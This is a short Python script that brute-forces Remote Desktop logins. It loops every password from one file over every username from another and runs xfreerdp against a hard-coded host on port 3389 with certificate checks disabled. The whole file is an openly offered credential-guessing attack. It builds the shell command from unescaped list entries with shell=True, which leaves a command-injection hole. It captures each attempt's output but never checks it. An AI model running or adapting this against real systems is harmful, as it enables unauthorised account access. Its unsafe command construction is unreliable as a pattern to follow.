import subprocess, time

ip = "10.0.0.1"

# Import usernames and passwords
with open('userlist.txt') as userlist, open('passwordlist.txt') as passwordlist:
    users = [line.rstrip() for line in userlist]
    passwords = [line.rstrip() for line in passwordlist]

# Iterate through all usernames for each password:
for password in passwords:
        for user in users:
                print('Attempting password "' + password + '" with username "' + user + '"')
                cmd = 'xfreerdp /cert-ignore /u:' + user + ' /p:"' + password + '" /v:' + ip + ':3389'
                #print(cmd)
                attempt = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                time.sleep(1)
